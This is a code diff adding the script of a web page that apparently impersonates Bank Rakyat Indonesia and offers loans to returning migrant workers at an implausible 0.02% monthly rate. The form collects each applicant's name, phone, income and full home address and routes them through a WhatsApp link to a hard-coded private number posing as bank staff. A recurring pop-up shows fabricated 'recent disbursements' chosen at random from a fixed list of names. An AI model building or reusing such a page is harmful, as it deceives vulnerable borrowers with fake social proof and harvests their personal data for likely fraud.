+                    b.classList.add('border-slate-200', 'text-slate-700');
+                });
+
+                btn.classList.remove('border-slate-200', 'text-slate-700');
+                btn.classList.add('bg-[#00529C]', 'text-white', 'border-[#00529C]', 'shadow-md');
+
+                selectedYears = parseInt(btn.getAttribute('data-years'));
+                selectedMonths = parseInt(btn.getAttribute('data-months'));
+
+                updateCalculator();
+            });
+        });
+
+        // Form Submit
+        loanApplicationForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            const name = document.getElementById('applicantName').value;
+            const phone = document.getElementById('applicantPhone').value;
+            const job = document.getElementById('applicantJob').value;
+            const income = document.getElementById('applicantIncome').value;
+            
+            const province = document.getElementById('applicantProvince').value;
+            const city = document.getElementById('applicantCity').value;
+            const district = document.getElementById('applicantDistrict').value;
+            const village = document.getElementById('applicantVillage').value;
+            const purpose = document.getElementById('loanPurpose').value;
+
+            const amount = parseInt(loanAmountInput.value) || 30000000;
+            const scheme = schemeSelect.value;
+            
+            const monthlyInterestRate = 0.0002;
+            const principalPerMonth = amount / selectedMonths;
+            const interestPerMonth = amount * monthlyInterestRate;
+            const monthlyPayment = Math.round(principalPerMonth + interestPerMonth);
+
+            const ADMIN_WA_NUMBER = '6281947710645'; 
+
+            const waText = `Halo Admin BRI, saya ingin mengajukan pinjaman purna PMI/TKW dengan rincian lengkap:
+
+👤 DATA PRIBADI & KEUANGAN:
+- Nama: ${name}
+- No. HP/WA: ${phone}
+- Negara Kerja: ${job}
+- Perkiraan Penghasilan: ${income}
+
+📍 ALAMAT DOMISILI DI INDONESIA:
+- Desa/Kel, RT/RW: ${village}
+- Kecamatan: ${district}
+- Kota/Kabupaten: ${city}
+- Provinsi: ${province}
+
+🎯 TUJUAN & SKEMA PINJAMAN:
+- Tujuan Peminjaman: ${purpose}
+- Skema Pembiayaan: ${scheme}
+- Plafond: ${formatRupiah(amount)}
+- Tenor: ${selectedYears} Tahun (${selectedMonths} Bulan)
+- Estimasi Cicilan: ${formatRupiah(monthlyPayment)} / Bulan (Bunga 0,02%)
+
+Mohon informasi proses verifikasi selanjutnya. Terima kasih.`;
+
+            waBtn.href = `https://wa.me/${ADMIN_WA_NUMBER}?text=${encodeURIComponent(waText)}`;
+
+            successModal.style.display = 'flex';
+            setTimeout(() => {
+                modalContent.classList.remove('scale-95', 'opacity-0');
+                modalContent.classList.add('scale-100', 'opacity-100');
+            }, 10);
+        });
+
+        function closeModalWithAnimation() {
+            modalContent.classList.remove('scale-100', 'opacity-100');
+            modalContent.classList.add('scale-95', 'opacity-0');
+            setTimeout(() => {
+                successModal.style.display = 'none';
+            }, 300);
+        }
+
+        closeModalBtn.addEventListener('click', closeModalWithAnimation);
+        window.addEventListener('click', (e) => {
+            if (e.target === successModal) closeModalWithAnimation();
+        });
+
+        // Live Notification Popups
+        const recentDisbursements = [
+            { name: "Siti Aisyah", location: "Indramayu", amount: 50000000 },
+            { name: "Sri Lestari", location: "Kendal", amount: 75000000 },
+            { name: "Yanti Nuraeni", location: "Cirebon", amount: 100000000 },
+            { name: "Rini Indriyani", location: "Malang", amount: 45000000 },
+            { name: "Marlina Rosita", location: "Lampung Timur", amount: 80000000 },
+            { name: "Endang Susanti", location: "Blitar", amount: 60000000 },
+            { name: "Lilis Mulyani", location: "Subang", amount: 120000000 },
+            { name: "Fatimah Zahra", location: "Lombok Tengah", amount: 55000000 }
+        ];
+
+        // Hero Slider
+        const heroSlider = document.getElementById('heroSlider');
+        const sliderDots = document.querySelectorAll('.slider-dot');
+        let currentSlide = 0;
+        const totalSlides = 3;
+
+        function updateSlider() {
+            heroSlider.style.transform = `translateX(-${currentSlide * 100}%)`;
+            sliderDots.forEach((dot, index) => {
+                if (index === currentSlide) {
+                    dot.classList.add('bg-white', 'w-6');
+                    dot.classList.remove('bg-white/60');
+                } else {
+                    dot.classList.remove('bg-white', 'w-6');
+                    dot.classList.add('bg-white/60');
+                }
+            });
+        }
+
+        function nextSlide() {
+            currentSlide = (currentSlide + 1) % totalSlides;
+            updateSlider();
+        }
+
+        let slideInterval = setInterval(nextSlide, 4500);
+
+        sliderDots.forEach((dot, index) => {
+            dot.addEventListener('click', () => {
+                currentSlide = index;
+                updateSlider();
+                clearInterval(slideInterval);
+                slideInterval = setInterval(nextSlide, 4500);
+            });
+        });
+
+        const liveNotification = document.getElementById('liveNotification');
+        const notifName = document.getElementById('notifName');
+        const notifText = document.getElementById('notifText');
+        const closeNotif = document.getElementById('closeNotif');
+        let notifTimeout;
+
+        function showLiveNotification() {
+            const randomItem = recentDisbursements[Math.floor(Math.random() * recentDisbursements.length)];
+            notifName.innerText = `${randomItem.name} (${randomItem.location})`;
+            notifText.innerText = `Berhasil mencairkan pinjaman ${formatRupiah(randomItem.amount)}`;
+
+            liveNotification.classList.remove('translate-x-32', 'opacity-0');
+            notifTimeout = setTimeout(hideLiveNotification, 8000);
+        }
+
+        function hideLiveNotification() {
+            liveNotification.classList.add('translate-x-32', 'opacity-0');
+        }
+
+        closeNotif.addEventListener('click', () => {
+            hideLiveNotification();
+            clearTimeout(notifTimeout);
+        });
+
+        setTimeout(() => {
+            showLiveNotification();
+            setInterval(showLiveNotification, 13000);
+        }, 3500);
+
+        updateCalculator();
+    </script>
+</body>
+</html>
